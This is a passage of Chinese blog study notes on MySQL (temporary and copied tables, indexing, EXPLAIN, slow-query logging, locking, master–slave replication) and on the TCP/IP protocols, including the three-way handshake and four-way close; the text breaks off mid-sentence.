3.23版本就无法使用MySQL的临时表。不过现在一般很少有再使用这么低版本的MySQL数据库服务了。 MySQL临时表只在当前连接可见，如果你使用PHP脚本来创建MySQL临时表，那每当PHP脚本执行完成后，该临时表也会自动销毁。 如果你使用了其他MySQL客户端程序连接MySQL数据库服务器来创建临时表，那么只有在关闭客户端程序时才会销毁临时表，当然你也可以手动销毁。 实例以下展示了使用MySQL 临时表的简单实例，以下的SQL代码可以适用于PHP脚本的mysql_query()函数。 1234567891011121314151617181920mysql&gt; CREATE TEMPORARY TABLE SalesSummary ( -&gt; product_name VARCHAR(50) NOT NULL -&gt; , total_sales DECIMAL(12,2) NOT NULL DEFAULT 0.00 -&gt; , avg_unit_price DECIMAL(7,2) NOT NULL DEFAULT 0.00 -&gt; , total_units_sold INT UNSIGNED NOT NULL DEFAULT 0);Query OK, 0 rows affected (0.00 sec)mysql&gt; INSERT INTO SalesSummary -&gt; (product_name, total_sales, avg_unit_price, total_units_sold) -&gt; VALUES -&gt; (&#39;cucumber&#39;, 100.25, 90, 2);mysql&gt; SELECT * FROM SalesSummary;+--------------+-------------+----------------+------------------+| product_name | total_sales | avg_unit_price | total_units_sold |+--------------+-------------+----------------+------------------+| cucumber | 100.25 | 90.00 | 2 |+--------------+-------------+----------------+------------------+1 row in set (0.00 sec) 当你使用 SHOW TABLES命令显示数据表列表时，你将无法看到 SalesSummary表。 如果你退出当前MySQL会话，再使用 SELECT命令来读取原先创建的临时表数据，那你会发现数据库中没有该表的存在，因为在你退出时该临时表已经被销毁了。 删除MySQL 临时表默认情况下，当你断开与数据库的连接后，临时表就会自动被销毁。当然你也可以在当前MySQL会话使用 DROP TABLE 命令来手动删除临时表。 以下是手动删除临时表的实例： 1234567891011121314151617181920212223mysql&gt; CREATE TEMPORARY TABLE SalesSummary ( -&gt; product_name VARCHAR(50) NOT NULL -&gt; , total_sales DECIMAL(12,2) NOT NULL DEFAULT 0.00 -&gt; , avg_unit_price DECIMAL(7,2) NOT NULL DEFAULT 0.00 -&gt; , total_units_sold INT UNSIGNED NOT NULL DEFAULT 0);Query OK, 0 rows affected (0.00 sec)mysql&gt; INSERT INTO SalesSummary -&gt; (product_name, total_sales, avg_unit_price, total_units_sold) -&gt; VALUES -&gt; (&#39;cucumber&#39;, 100.25, 90, 2);mysql&gt; SELECT * FROM SalesSummary;+--------------+-------------+----------------+------------------+| product_name | total_sales | avg_unit_price | total_units_sold |+--------------+-------------+----------------+------------------+| cucumber | 100.25 | 90.00 | 2 |+--------------+-------------+----------------+------------------+1 row in set (0.00 sec)mysql&gt; DROP TABLE SalesSummary;mysql&gt; SELECT * FROM SalesSummary;ERROR 1146: Table &#39;RUNOOB.SalesSummary&#39; doesn&#39;t exist MySQL 复制表如果我们需要完全的复制MySQL的数据表，包括表的结构，索引，默认值等。 如果仅仅使用CREATE TABLE … SELECT 命令，是无法实现的。 本章节将为大家介绍如何完整的复制MySQL数据表，步骤如下： 使用 SHOW CREATE TABLE 命令获取创建数据表(CREATE TABLE) 语句，该语句包含了原数据表的结构，索引等。 复制以下命令显示的SQL语句，修改数据表名，并执行SQL语句，通过以上命令 将完全的复制数据表结构。 如果你想复制表的内容，你就可以使用 INSERT INTO … SELECT 语句来实现。 实例尝试以下实例来复制表 runoob_tbl 。 步骤一： 获取数据表的完整结构。 123456789101112131415mysql&gt; SHOW CREATE TABLE runoob_tbl \\G;*************************** 1. row *************************** Table: runoob_tblCreate Table: CREATE TABLE &#96;runoob_tbl&#96; ( &#96;runoob_id&#96; int(11) NOT NULL auto_increment, &#96;runoob_title&#96; varchar(100) NOT NULL default &#39;&#39;, &#96;runoob_author&#96; varchar(40) NOT NULL default &#39;&#39;, &#96;submission_date&#96; date default NULL, PRIMARY KEY (&#96;runoob_id&#96;), UNIQUE KEY &#96;AUTHOR_INDEX&#96; (&#96;runoob_author&#96;)) ENGINE&#x3D;InnoDB 1 row in set (0.00 sec)ERROR:No query specified 步骤二： 修改SQL语句的数据表名，并执行SQL语句。 123456789mysql&gt; CREATE TABLE &#96;clone_tbl&#96; ( -&gt; &#96;runoob_id&#96; int(11) NOT NULL auto_increment, -&gt; &#96;runoob_title&#96; varchar(100) NOT NULL default &#39;&#39;, -&gt; &#96;runoob_author&#96; varchar(40) NOT NULL default &#39;&#39;, -&gt; &#96;submission_date&#96; date default NULL, -&gt; PRIMARY KEY (&#96;runoob_id&#96;), -&gt; UNIQUE KEY &#96;AUTHOR_INDEX&#96; (&#96;runoob_author&#96;)-&gt; ) ENGINE&#x3D;InnoDB;Query OK, 0 rows affected (1.80 sec) 步骤三： 执行完第二步骤后，你将在数据库中创建新的克隆表 clone_tbl。 如果你想拷贝数据表的数据你可以使用 INSERT INTO… SELECT 语句来实现。 123456789mysql&gt; INSERT INTO clone_tbl (runoob_id, -&gt; runoob_title, -&gt; runoob_author, -&gt; submission_date) -&gt; SELECT runoob_id,runoob_title, -&gt; runoob_author,submission_date -&gt; FROM runoob_tbl;Query OK, 3 rows affected (0.07 sec)Records: 3 Duplicates: 0 Warnings: 0 执行以上步骤后，你将完整的复制表，包括表结构及表数据。 另一种完整复制表的方法:12CREATE TABLE targetTable LIKE sourceTable;INSERT INTO targetTable SELECT * FROM sourceTable; 其他: 可以拷贝一个表中其中的一些字段: 1234CREATE TABLE newadmin AS( SELECT username, password FROM admin) 可以将新建的表的字段改名: 1234CREATE TABLE newadmin AS( SELECT id, username AS uname, password AS pass FROM admin) 可以拷贝一部分数据: 1234CREATE TABLE newadmin AS( SELECT * FROM admin WHERE LEFT(username,1) &#x3D; &#39;s&#39;) 可以在创建表的同时定义表中的字段信息: 12345678CREATE TABLE newadmin( id INTEGER NOT NULL AUTO_INCREMENT PRIMARY KEY)AS( SELECT * FROM admin) 区分下mysql复制表的两种方式。 第一、只复制表结构到新表 create table 新表 select * from 旧表 where 1=2 或者 create table 新表 like 旧表 第二、复制表结构及数据到新表 create table新表 select * from 旧表 主要配置文件二进制文件日志log-bin主从复制 错误日志log-error默认是关闭的,记录严重的警告和错误信息,每次启动和关闭的详细信息等 查询日志log默认关闭,记录查询的sql语句,如果开启会减低mysql的整体性能,因为记录日志也是需要消耗系统资源的 数据文件库默认路径: /var/lib/mysql frm文件存放表结构 MYD文件存放的是数据,DATA MYI文件存放的是查找数据的索引,INDEX 逻辑结构 存储引擎1show enigines 查看mysql当前默认的存储引擎 1show variable like &#39;%storage_engine%&#39; MyisAm和InnoDB区别 SQL执行加载顺序手写 机读 索引 MYSQL官方对索引的定义：索引(Index)是帮助MYSQL高效获取数据的数据结构.可以得到索引的本质:索引就是数据结构. “排好序的快速查找数据结构” 对排序和查找都有影响 在数据之外,数据库系统还维护着满足特定查找算法的数据结构,这些数据结构以某种方式引用(指向)数据. 这样可以在这些数据结构上实现高级查找算法.这种数据结构,就是索引.下图就是一种可能的索引方式示例: 索引的目的在于提高查找效率,可以类比字典; 一般来说索引本身也很大,不可能全部存储在内存中,因此索引往往以索引文件的形式存储的磁盘上 我们平常所说的索引,如果没有特别指明,都是指b+树(多路搜索树,并不一定是二叉的)结构组织的索引,其中聚集索引,次要索引,覆盖索引,复合索引,前缀索引,唯一索引默认都是使用B+树索引,统称索引.当然,除了B+树这种类型的索引之外,还有哈希索引(hash index)等 索引优势类似大学图书馆建书目索引,提高数据检索的效率,降低数据库的IO成本,通过索引对数据进行排序,降低数据排序的成本,降低了CPU的消耗. 劣势 索引的分类单值索引即一个索引只包含单个列，一个表可以有多个单列索引 唯一索引索引列的值必须唯一，但允许有空值 复合索引即一个索引包含多个列 索引的命名语句创建 CREATE [UNIQUE] INDEX indexName ON mytable(columnname(length)); ALTER mytable ADD [UNIQUE] INDEX [indexName] ON (columnname(name)); 删除 DROP INDEX [indexName] ON mytable; 查看 SHOW INDEX FROM table_name\\G 使用ALTER命令 索引结构BTree索引 b+树 Hash索引 full-text全文索引 R-Tree索引 哪些情况需要创建索引？ 主键自动创建索引 频繁作为查询条件的字段应该创建索引 查询中与其他表关联的字段，外键关系建立索引 频繁更新的字段不适合创建索引，因为每次更新不单单是更新了记录还会更新索引 where条件里用不到的字段不创建索引 单键/组合索引的选择问题（在高并发下倾向创建组合索引） 查询中排序的字段，排序字段若通过索引去访问将大大提高排序速度 查询中统计或者分组的字段 哪些情况不需要创建索引？ 表记录太少 经常增删改的表 提高了查询速度，同时会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。 因为在更新表时，MYSQL不仅要保存数据，还要保存一些索引文件。 数据重复且分布均匀的表字段，因此应该只为最经常查询和最经常排序的数据建立索引。 如果某个数据列包含许多重复内容，为它建立索引就没有太大的实际效果。 性能分析（查询执行计划）MYSQL QUERY Optimizer MYSQL的常见瓶颈 Explain 能干吗 表的读取顺序 数据读取操作的操作类型 哪些索引可以使用 那些索引被实际使用 表之间的引用 每张表有多少行被优化器查询 使用：Explain + SQL语句执行计划包含的信息 表的读取顺序id： select查询的序列号,包含一组数字,表示查询中执行select子句或操作表的顺序 三种情况: id相同,执行顺序由上至下 id不同,如果是子查询,id的序号会递增,id值越大优先级会越高,越先被执行. id相同不同,同时存在 derive的2指的是id为2的t3. 数据读取操作的操作类型select_type： table：显示这一行数据是关于哪张表的 type：访问类型 显示查询使用了何种类型， 从最好到最差依次是： system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index &gt;ALL system const eq_ref ref range index ALL 全表扫描 possible_keys 和 key：possible_keys： key： key_len: 4(char长度)*3(UTF-8）+1（null）=13 ref: rows: extra:包含不适合在其他列中显示但十分重要的额外信息 Using filesort 说明mysql会对数据使用一个外部的索引排序,而不是按照表内的索引顺序进行读取,MYSQL中无法利用索引完成的排序操作被称为”文件排序” Using temporary Using index 覆盖索引,在possible_keys没有出现但在key出现 覆盖索引: Using where 使用了where过滤 using join buffer 使用了连接缓存 impossiable where where子句的值总是false,不能用来获取任何元组 select tables optimized away 在没有GROUPBY子句的情况下,基于索引优化MIN/MAX操作或者对于MyISAM存储引擎优化COUNT(*)操作不必等到执行阶段再进行计算,查询执行计划生成的阶段即完成优化. distinct 优化distinct操作，在找到第一匹配的元组后即停止找同样值的动作。 单表优化 范围使索引失效 两表优化 先尝试只添加右表的索引 左表 所以左连接要加右表。左表全有，加不加索引都是全表查询。三表优化 索引优化避免索引失效建表 全值匹配 第一层索引没用上，梯子断裂，最佳左前缀原则 最佳左前缀原则 如果索引了多列，要遵守最左前缀法则。指的是查询从索引的最左前列开始并且不跳过索引中的列。 不在索引列上做任何操作 存储引擎不能使用索引中范围条件右边的列 范围后面的索引失效 尽量使用覆盖索引 使用不等于（!=或者&lt;&gt;）的时候无法使用索引会导致全表扫描 is not,is not null无法使用索引 like以通配符开头使索引失效会变成全表扫描 要使用两边都带有通配符 ‘ %XX% ‘ 的解决方法: 创建覆盖索引; 字符串不加单引号索引失效 少用or,用它来连接时索引失效 other: 范围后索引断开,使用范围的字段也部分使用了索引. 用于字段排序的索引一定要按照建立索引的字段顺序.否则会产生filesort. 排序也会使用索引并且不会断开,但不显示在ref字段上. 分组之前必排序,会有临时表产生 查询截取分析查询优化 小表驱动大表 “select 1 from”的1是什么都行,是个常量就行 in 和 exists Order by关键字排序优化 order by子句，尽量使用index方式排序，避免使用filesort方式排序； 默认是升序。要不就全部升序,要不就全部降序 尽可能在索引树上完成排序操作，遵照索引建的最佳最前缀 如果不在索引列上，filesort有两种算法: mysql就要启动双路排序和单路排序； 双路排序：MYSQL4.1之前是使用双路排序，字面意思就是两次扫描磁盘，最终得到数据，读取行指针和orderby列，对他们进行排序，然后扫描已经排序好的列表，按照列表中的值重新从列表中读取对应的数据输出。 从磁盘取排序字段，在buffer进行排序，再从磁盘取其他字段。 取一批数据，要从磁盘进行了两次扫描，众所周知，I\\O是很耗时的，所以在mysql4.1之后，出现了第二种改进的算法，就是单路排序。 单路排序：从磁盘读取查询需要的所有列，按照order by列在buffer对它们进行排序，然后扫描排序后的列表进行输出，它的效率更快一些，避免了第二次读取数据。并且把随机IO变成了顺序IO，但是它会使用更多的空间。因为它把每一行都保存在内存了。 单路是后出的，总体而言好过双路。 单路也有问题： 优化策略 增大sort_buffer_size参数的设置 增大max_length_for_sort_data参数的设置 总结: group by关键字优化 慢查询日志 查看是否开启 1SHOW VARIABLES LIKE &#39;%slow_query_log%&#39;; 默认是关闭的 开启 1set global slow_query_log&#x3D;1; 开启了慢查询日志后,什么样的SQL才会记录到慢查询日志里面呢? 设置慢的阈值时间: 123456set global long_query_time&#x3D;3;##需要重新连接或新开一个会话才能看到修改值.SHOW VARIABLES LIKE &#39;long_query_time%&#39;;##或者使用SHOW global VARIABLES LIKE &#39;long_query_time&#39;; 模拟 1select sleep(4); 查看日志 1cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;***.log 查询当前系统中有多少条慢查询记录 配置文件 日志分析工具在生产环境中,如果要手工分析日志,查找、分析SQL,显然是个体力活,MYSQL提供了日志分析工具mysqldumpslow. 使用帮助 1mysqldumpslow --help 常用参考: 批量插入数据脚本 建数据库 12create database bigData;use bigData; 建表dept 123456789CREATE TABLE dept( id INT UNSIGNED PRIMARY KEY AUTO_INCREMENT, ##部门编号 deptno MEDIUMINT UNSIGNED NOT NULL DEFAULT 0, ##部门名称 dname VARCHAR(20) NOT NULL DEFAULT \"\", ##楼层 loc VARCHAR(13) NOT NULL DEFAULT \"\")ENGINE = INNODB DEFAULT CHARSET=GBK; 建表emp 设置参数log_bin_trust_function_creators 随机产生部门字符串 创建存储过程 创建往emp表插入数据的存储过程function:有返回值 procedure:无返回值 创建往dept表插入数据的存储过程 调用存储过程 dept emp Show Profile 是mysql提供可以用来分析当前会话中语句执行的资源消耗情况.可以用于SQl的调优的测量. 默认情况下,参数处于关闭状态,并保存最近15次的运行结果. 看看当前的mysql版本是否支持 123Show variables like &#39;profiling&#39;; 或者Show variables like &#39;profiling%&#39;;##默认是关闭的,使用前需要开启 开启功能 运行SQL 12select * from emp group by id%10 limit 150000;select * from emp group by id%20 order by 5; 查看结果 1show profiles; 诊断SQL 1show profile cpu, block io for query ID(上一步前面的问题SQL数字号码); 需要注意的: 全局查询日志永远不要在生产环境开启这个功能,仅在测试环境使用.配置开启: 编码开启: 数据库锁锁是计算机协调多个进程或线程并发访问某一资源的机制.在数据库中,除传统的计算资源(如CPU,RAM,I/O等)的争用以外,数据也是供许多用户共享的资源.如何保证数据并发访问的一致性、有效性hi所有数据库必须解决的一个问题，锁冲突也是影响数据库并发访问的一个重要因素。从这个角度来说，锁对数据库而言显得尤其重要，也更加复杂。 锁的分类从对数据操作的类型(读\\写)分 读锁(共享锁): 针对同一份数据,多个读操作可以同时进行而不会互相影响 写锁(排他锁): 当前写操作没有完成前,它会阻断其他写锁和读锁; 从对数据操作的粒度分 表锁 行锁 MYSQL锁机制三锁 ↓表锁(偏读)特点:偏向MyISAM存储引擎,开销小,加锁快;无死锁;锁定粒度大,发生锁冲突的概率最高,并发度最低 案例: 读操作时共享的,会话1和2都可以读mylock; 会话1不能更新表; 会话1只能读加读锁的mylock表,不能读其他表(book);会话2可以读其他表. 会话2如果要更新表,会形成阻塞,要等待锁的释放(unlock tables) 写锁 其他会话读被锁的表会阻塞; 结论: 简而言之,就是读锁会阻塞写,但是不会堵塞读,而写锁则会把读和写都堵塞. 看看哪些表被锁了1show open tables; 如何分析表锁定 行锁(偏写)特点：偏向InnoDB存储引擎，开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高。 InnoDB与MyISAM的最大不同也有两点： 一是支持事务(TRANSACTION); 二是采用了行级锁. 事务(Transaction)及其ACID属性 并发处理事务带来的问题 更新丢失(Lost Update) 脏读(Dirty Reads) 不可重复读(Non-Repeatable Reads) 幻读(Planttom Reads) 事务隔离级别; 默认级别是Repeatable read 案例分析:建表 select * from test_innodb_lock; 在没session1和2提交commit之前,session-2读不到修改的数据. 操作不同行,不会阻塞 无索引行锁变表锁;类型转换,索引失效: (b=’4000’) 行锁变表锁,造成阻塞. 间隙锁的危害 session2会阻塞, 如何锁定一行 行锁总结 如何分析行锁定 优化建议: 页锁开销和加锁时间界于表锁和行锁之间,会出现死锁;锁定粒度界于表锁和行锁之间,并发度一般. 主从复制复制的基本原理： slave会从master读取binlog来进行数据同步 复制的基本原则： 每个slave只有一个master 每个slave只能有一个唯一的服务器ID 每个master可以有多个slave 复制的最大问题：延时 一主一从常见配置： mysql版本要一致且后台以服务运行. 网段要相通ping 主从都配置在[mysqld]结点下,都是小写. 主机(window)修改my.ini配置文件 主服务器唯一ID[必须] server-id = 1 启动二进制日志[必须] log-bin=自己本地的路径/mysqlbin log-bin=D:/devSoft/MySQLServer5.5/data/mysqlbin 启用错误日志[可选] log-err = 自己本地的路径/mysqlerr log-err = D:/devSoft/MySQLServer5.5/data/mysqlerr 根目录[可选] basedir = “自己本地路径” basedir = “D:/devSoft/MySQLServer5.5/“ 临时目录[可选] tmpdir = “自己本地路径” tmpdir = “D:/devSoft/MySQLServer5.5/“ 数据目录[可选] datadir = “自己本地路径/Data/“ datadir = “D:/devSoft/MySQLServer5.5/Data/“ read-only=0 主机, 读写都可以 设置不要复制的数据库[可选] binlog-ignore-db=mysql 设置需要复制的数据库[可选] binlog-do-db=需要复制的主数据库名字 从机(Linux)修改my.cnf配置文件 从服务器唯一ID[必须] 注释 server-id=1 下翻,取消注释server-id = 2 启动二进制日志[可选] 因修改过配置文件,请主机+从机都重启后台mysql服务 123service mysql stopservice mysql startps -ef|grep mysql 主机从机都关闭防火墙 12window 手动关闭linux从机 service iptables stop 在window主机上建立账户并授权slave mysql 1flush privileges 查看master的状态 1show master status; 记录下File和Position的值. Position在后面使用后会有变化 在linux从机上配置需要复制的主机 启动从服务器复制功能 1start slave; 1234show slave status\\G下面两个参数都是Yes,则说明主从配置成功.Slave_IO_Running:YesSlave_SQL_Running:Yes 主机建库,建表 insert记录 从机有记录 停止从机复制功能 1stop slave;","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"https://kayleh.top/tags/sql/"}]},{"title":"HTTP","slug":"HTTP","date":"2020-07-26T18:58:34.000Z","updated":"2021-04-11T17:11:28.151Z","comments":true,"path":"http/","link":"","permalink":"https://kayleh.top/http/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"TCP/IP","slug":"TCP-IP","date":"2020-07-26T18:58:27.000Z","updated":"2021-04-11T17:11:28.460Z","comments":true,"path":"tcpip/","link":"","permalink":"https://kayleh.top/tcpip/","excerpt":"TCP/IP协议","text":"TCP/IP协议 TCP/IP协议模型(Transmission Control Protocol/Internet Protocol),包含了一系列构成互联网基础的网络协议，是Internet的核心协议。TCP/IP协议参考模型： 分为四个层次：数据链路层 TCPIP协议 描述 应用层 HTTP FTP 传输层 TCP UDP 网络层 IP协议：负责对数据加上IP地址和其他的数据以确定传输的目标 数据链路层 为待传的数据加入一个以太网协议头，并进行CRC编码，为数据传输做准备 TCP/IP协议通信过程： 对应着数据入栈和出栈的过程。入栈：数据发送方每层不断的封装首部和尾部，添加一些传输的信息，确保能传输到目的地。出栈：数据接收方每层不断地拆除首部与尾部，得到最终传输的数据。 数据链路层原理：物理层负责0,1比特流与物理设备电压高低、光的闪灭之间的互换。详解：数据链路层负责将0,1序列划分为数据帧从一个节点传输到临近的另一个节点，这些节点是通过MAC来唯一标识的。功能： 封装成帧：把网络层数据报加头和尾，封装成帧，帧头中包括源MAC地址和目的MAC地址 透明传输：指不管所传数据是什么样的比特组合，都应当能够在链路上传送。当所传数据中的比特组合恰巧与某一个控制信息完全一样时，就必须采取适当的措施，使接收方不会将这样的数据误认为是某种控制信息。 可靠传输：采用一系列技术来保障信息在发送方和接收方准确、精确的传输。在出错率很低的链路上很少用，但是无线链路WLAN会保证可靠传输 差错检测(CRC)： 接收者检测错误，如果发现差错，丢弃该帧。 网络层IP协议：所有的TCP、UDP、IMCP、IGMP的数据都以IP数据格式传输。注意：IP是不可靠协议，即，IP协议没有提供一种数据未传达以后的处理机制，而是让上层协议TCP或UDP处理。 IP地址划分：数据链路层中是通过MAC地址识别不同节点，在IP层的地址标识是IP地址。 32位IP地址 = 网络号 + 地址位这样划分的目的：减少路由器中路由表记录的数目网络地址：可以限定拥有相同网络地址的终端在同一个范围内，路由器只需要维护一条这个网络地址的方向就可以找到其终端了。IP分类： A类IP地址： 0.0.0.0 ~ 127.255.255.255 B类IP地址： 128.0.0.0 ~ 191.255.255.255 C类IP地址： 192.0.0.0 ~ 239.255.255.255 D类IP地址： IP数据报的完整格式一个IP数据报有首部和数据两部分组成。首部前一部分是固定长度，20字节；可选字段的长度是可变的 ARP及RARP协议ARP：地址解析协议，根据IP地址获取MAC地址的一种协议主机是不知道这个ip对应的是哪个主机的哪个接口，当主机要发送一个IP包的时候，会首先查一下自己的ARP高速缓存(IP-MAC地址对应表缓存)如果查询的IP-MAC值对不存在，那么主机就向网络发送一个ARP协议广播包，这个广播包里面就有待查询的IP地址，而直接收到这份广播的包的所有主机都会查询自己的IP地址，如果收到广播包的某一个主机发现自己符合条件，那么就准备好一个包含自己的MAC地址的ARP包传送给发送ARP广播的主机。 而广播主机拿到ARP包后会更新自己的ARP缓存（就是存放IP-MAC对应表的地方）。发送广播的主机就会用新的ARP缓存数据准备好数据链路层的的数据包发送工作。 RARP协议的工作与此相反，不做赘述。 IPMP协议IP协议并不是一个可靠的协议，它不保证数据被送达，那么，自然的，保证数据送达的工作应该由其他的模块来完成。其中一个重要的模块就是ICMP(网络控制报文)协议。ICMP不是高层协议，而是IP层的协议。 当传送IP数据包发生错误。比如主机不可达，路由不可达等等，ICMP协议将会把错误信息封包，然后传送回给主机。给主机一个处理错误的机会，这 也就是为什么说建立在IP层以上的协议是可能做到安全的原因。 PINGping可以说是ICMP的最著名的应用，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。 TracerouteTraceroute是用来侦测主机到目的主机之间所经路由情况的重要工具，也是最便利的工具。 Traceroute的原理是非常非常的有意思，它收到到目的主机的IP后，首先给目的主机发送一个TTL=1的UDP数据包，而经过的第一个路由器收到这个数据包以后，就自动把TTL减1，而TTL变为0以后，路由器就把这个包给抛弃了，并同时产生 一个主机不可达的ICMP数据报给主机。主机收到这个数据报以后再发一个TTL=2的UDP数据报给目的主机，然后刺激第二个路由器给主机发ICMP数据 报。如此往复直到到达目的主机。这样，traceroute就拿到了所有的路由器IP。 DNSDNS（Domain Name System，域名系统），因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。 运输层协议进程之间的通信网络的边缘部分的两个主机使用网络的核心部分的功能进行端到端通信时，只有主机的协议栈才有运输层，网络核心部分中的路由器在转发分组时只用到下三层的功能端到端的通信是应用进程之间的通信。运输层的作用复用(multiplexing)：指在发送方不同的应用进程都可以使用同一个运输层协议传送数据分用(demultiplexing)：指接收方的运输层在剥去报文的首部后能够把这些数据正确交付到目的应用进程运输层和网络层区别网络层是为主机之间提供逻辑通信，而运输层为应用进程之间提供端到端的逻辑通信；运输层要对收到的报文进行差错检测 运输层两个协议主要的协议：TCP、UDP UDP协议 用户数据报协议UDP(User Datagram Protocol)主要应用：DNS/TFTP/RIP/BOOTP/DHCP/SNMP/NFS/IGMP 特点： 无连接 使用尽最大努力交付(即，不保证可靠交付) 面向报文：应用层交给UDP多长的报文，UDP就照样发送，既不合并也不拆分若报文太长，IP层传送时要进行分片。因此应用进程要选择合适大小的报文 UDP首部开销小，只有8字节，比TCP的20字节要短 UDP数据包组成：数据字段、首部字段首部字段共8字节：源端口、目的端口、长度、检验和 端口不可达如果接收方UDP发现报文中的目的端口号不正确(不存在对应于该端口号的应用进程)，就丢弃该报文并由ICMP发送端口不可达差错报文给发送方 伪首部：只有在计算检验和时，临时添加在UDP用户数据报前面的数据，由此计算检验和。伪首部既不向下传送，也不向上递交。 TCP协议 应用：SMTP/TELNET/HTTP/FTP 特点：1.面向连接的运输层协议2.每一条TCP连接只能有两个端点，每一条TCP连接只能是点对点的3.TCP提供可靠交付的服务4.提供全双工通信5.面向字节流：虽然应用程序和TCP的交互是一次一个数据块，但TCP把应用程序交下来的数据看成仅仅是一连串的无结构的字节流。 TCP根据对方给出的窗口值和当前网络拥塞程度来决定一个报文段应包含多少个字节 TCP连接的端点是套接字，即(IP地址:端口号) 停止等待协议“超时重传”：A只要超过一段时间没有收到确认，就认为刚才发送的分组丢失了，因而重传签名发送过的分组。需要设置超时计时器对于迟到的确认，B会(1)丢弃这个重复的分组M2，不向上层交付。(2)向A发送确认缺点：信道利用率太低 连续ARQ协议定义：发送方每收到一个确认，就把发送窗口向前滑行一个分组的位置。接收方一般都采用累计确认的方式。即：接收方在收到几个分组后，对按序到达的最后一个分组发送确认。表示到这个分组为止的所有分组都已经正确收到了。 TCP报文格式 三次握手TCP在传输之前会进行三次沟通，一般称为“三次握手”，传完数据断开的时候要进行四次沟通，一般称为“四次挥手”。 具体流程：1.最初状态：A和B的TCP进程都处于CLOSED状态2.B的TCP服务器进程先创建传输控制块TCB，准备接受客户进程的连接请求。然后服务器进程处于LISTEN状态，等待客户的连接请求3.A的TCP客户进程创建传输控制模块TCB，然后向B发出连接请求报文段，首部的同部位SYN=1，同时选择一个初始序号seq=x这时，TCP客户进程进入SYN-SENT(同步已发送)状态4.B收到连接请求后，如果同意建立连接，则向A发送确认。确认报文中SYN=1,ACK=1，确认号ack=x+1同时选择一个自己的初始序号seq=y，服务器进程进入SYN-RCVD(同步收到)状态。5.TCP客户端收到B的确认后，还要向B发送确认，确认报文ACK=1,确认号ack=y+1，自己的序号seq=x+1。这时，TCP连接建立，A进入ESTABLISHED状态6.B收到A的确认后，也进入ESTABLISHED状态 四次挥手 具体流程：1.初始状态：A和B都处于ESTABLISHED状态2.A先向TCP发送连接释放报文段，并停止发送数据，主动关闭TCP连接。报文段中FIN=1，序号seq=u(已传送过的数据的最后一个字节的序号加1)，这时A进入FIN-WAIT-1(终止等待1)状态，等待B确认。3.B收到释放报文后即发出确认，确认号ack=u+1,字节序号是v(B前面已传送数据最后一个字节序号+1)，B进入CLOSE-WAIT(关闭等待)状态。 这时的TCP处于半关闭状态。即：从B到A的方向的连接并未关闭。4.A收到确认后，进入FIN-WAIT-2(终止等待2)状态，等待B发出的连接释放报文段5.若B没有需要发送的数据，就通知TCP释放连接，FIN=1,选择序号w,ack=u+1,此时B进入LAST-ACK(最后确认)状态6.A收到B的连接释放报文段后，必须对此发出确认，ACK=1,ack=w+1,seq=u+1，A进入TIME-WAIT(时间等待)状态7.经过时间等待计时器(TIME-WAIT timer)设置的时间2MSL后，A进入CLOSED状态 TIME-WAIT状态为什么必须等待2MSL时间？ 为了保证A发送的最后一个ACK报文段能够到达B。（B收不到A发送的ACK时会重传关闭的报文，因此A需要等待其发送的ACK是否成功） 防止已失效的连接请求报文段出现在本连接中。 TCP流量控制 定义：让发送方的发送速率不要太快，要让接收方来得及接收。 滑动窗口实现流量控制发送方的发送窗口不能超过接收方给出的接收窗口的数值。(TCP的窗口单位是字节，不是报文段) 解决死锁：TCP为每一个连接设一个持续计时器。只要TCP连接的一方收到对方的零窗口通知，就启动持续计时器。若持续计时器设置的时间到期，就发送一个零窗口探测报文段(仅携带1字节数据)，对方就在确认这个探测报文段时给出现在的窗口值。 TCP拥塞控制 定义：计算机网络中的带宽、交换节点的缓存和处理机等都是网络资源。在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏，这种情况叫拥塞。 简单的通过增加一些资源，比如把结点缓存的存储空间扩大，或把链路更换为更高速率的链路，或把结点处理机的运算速度提供，并不能解决网络拥塞问题。因为问题的实质是整个系统的各个部分不匹配，只有所有部分都平衡了，问题才能解决。 拥塞控制的四种算法：满开始(slow-start)、拥塞避免(congestion avoidance)、快重传(fast retransmit)、快恢复(fast recovery) 为什么要三次握手？ 为了防止已失效的连接请求报文突然又传送到了服务端，因为产生错误。具体解释： “已失效的连接请求报文段”产生情况：client 发出的第一个连接请求报文段并没有丢失，而是在某个网络节点长时间滞留，因此导致延误到连接释放以后的某个时间才到达 service。如果没有三次握手，那么此时server收到此失效的连接请求报文段，就误认为是 client再次发出的一个新的连接请求，于是向 client 发出确认报文段，同意建立连接，而此时 client 并没有发出建立连接的情况，因此并不会理会服务端的响应，而service将会一直等待client发送数据，因此就会导致这条连接线路白白浪费。如果此时变成两次挥手行不行？这个时候需要明白全双工与半双工，再进行回答。比如： 第一次握手： A给B打电话说，你可以听到我说话吗？第二次握手： B收到了A的信息，然后对A说： 我可以听得到你说话啊，你能听得到我说话吗？第三次握手： A收到了B的信息，然后说可以的，我要给你发信息啦！在三次握手之后，A和B都能确定这么一件事： 我说的话，你能听到； 你说的话，我也能听到。 这样，就可以开始正常通信了，如果是两次，那将无法确定。 为什么要四次挥手？ TCP 协议是一种面向连接，可靠，基于字节流的传输层通信协议。TCP 是全双工模式(同一时刻可以同时发送和接收)，这就意味着，当主机1发出 FIN 报文段时，只是表示主机1已结没有数据要发送了，主机1告诉主机2，它的数据已经全部发送完毕；但是，这个时候主机1还是可以接受来自主机2的数据；当主机2返回 ACK报文段时，这个时候就表示主机2也没有数据要发送了，就会告诉主机1，我也没有数据要发送了，之后彼此就会中断这次TCP连接。 TCP的三次握手与四次挥手具体过程如下： 第一次握手：建立连接。客户端发送连接请求报文段，并将syn(标记位)设置为1，Squence Number(数据包序号)(seq)为x,接下来等待服务端确认，客户端进入SYN_SENT状态(请求连接)； 第二次握手：服务端收到客户端的 SYN 报文段，对 SYN 报文段进行确认，设置 ack(确认号)为 x+1(即seq+1 ; 同时自己还要发送 SYN 请求信息，将 